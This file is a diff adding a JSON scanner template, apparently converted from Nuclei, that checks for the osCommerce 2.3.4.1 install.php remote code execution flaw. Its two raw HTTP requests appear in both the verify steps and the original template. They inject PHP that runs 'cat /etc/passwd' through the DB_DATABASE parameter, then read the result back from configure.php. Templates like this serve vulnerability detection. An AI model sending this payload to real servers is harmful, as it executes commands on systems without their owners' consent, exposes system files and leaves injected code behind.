@@ -1,0 +1,140 @@
+{
+  "id": "oscommerce-rce",
+  "name": "osCommerce 2.3.4.1 - Remote Code Execution",
+  "author": "Suman_Kar",
+  "severity": "HIGH",
+  "description": "osCommerce 2.3.4.1 is susceptible to remote code execution via install.php. A remote attacker can inject PHP code into the db_database parameter and subsequently use the configure.php page to to read the command\u0027s executed output.",
+  "references": [
+    "https://www.exploit-db.com/exploits/50128",
+    "https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution"
+  ],
+  "tags": [
+    "rce",
+    "oscommerce",
+    "edb"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /install/install.php?step\u003d4 HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nDIR_FS_DOCUMENT_ROOT\u003d.%2F\u0026DB_DATABASE\u003d%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A\n",
+        "GET /install/includes/configure.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "oscommerce-rce",
+    "info": {
+      "name": "osCommerce 2.3.4.1 - Remote Code Execution",
+      "author": "Suman_Kar",
+      "severity": "high",
+      "description": "osCommerce 2.3.4.1 is susceptible to remote code execution via install.php. A remote attacker can inject PHP code into the db_database parameter and subsequently use the configure.php page to to read the command\u0027s executed output.",
+      "reference": [
+        "https://www.exploit-db.com/exploits/50128",
+        "https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution"
+      ],
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "rce,oscommerce,edb"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /install/install.php?step\u003d4 HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nDIR_FS_DOCUMENT_ROOT\u003d.%2F\u0026DB_DATABASE\u003d%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A\n",
+          "GET /install/includes/configure.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
